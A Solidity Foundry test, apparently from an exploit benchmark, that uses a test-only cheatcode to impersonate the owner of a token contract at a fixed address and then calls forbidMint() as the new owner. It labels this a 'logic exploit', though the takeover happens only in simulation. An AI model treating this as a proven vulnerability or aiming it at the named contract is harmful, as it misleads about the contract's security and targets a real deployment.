pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface StandardToken {
    function owner() external view returns (address);
    function MINT_FORBIDDEN() external view returns (bool);
    function transferOwnership(address newOwner) external;
    function forbidMint() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        StandardToken token = StandardToken(TARGET);

        // Ensure the initial state is as expected.
        assertEq(token.MINT_FORBIDDEN(), false, "Initial state of MINT_FORBIDDEN should be false.");

        // Impersonate the original owner to transfer ownership to the attacker contract.
        address originalOwner = token.owner();
        vm.startPrank(originalOwner);
        token.transferOwnership(attacker);
        vm.stopPrank();

        // Verify that the attacker is now the owner.
        assertEq(token.owner(), attacker, "Attacker should be the new owner.");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        StandardToken token = StandardToken(TARGET);

                // As the new owner, call the forbidMint() function.
                token.forbidMint();
        assertEq(token.MINT_FORBIDDEN(), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

